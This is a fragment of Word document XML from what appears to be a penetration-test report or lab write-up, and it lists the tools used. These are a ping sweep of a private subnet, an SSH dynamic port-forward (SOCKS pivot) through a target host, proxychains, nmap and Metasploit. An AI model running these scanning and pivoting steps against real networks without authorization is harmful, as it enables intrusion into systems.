          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>U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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId43"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">r </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">g </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="8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404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="36"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">D </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>08</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">N </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
